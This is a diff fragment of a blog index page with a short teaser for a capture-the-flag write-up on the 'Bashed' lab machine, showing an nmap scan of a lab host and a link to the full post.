+                <p>User flag It is not really necessary to start this one with nmap, but it's never a bad first step root@kali:~# nmap -sS -Pn -sV 10.10.10.68 Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET Nmap scan report for 10.10.10.68 Host is up (0.11s latency). Not shown: 999 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1...</p>
+                <a href="/bashed.html">Read More</a>
                 <hr class="uk-article-divider">
-            </article>
+        </article>
 
 
 </div>
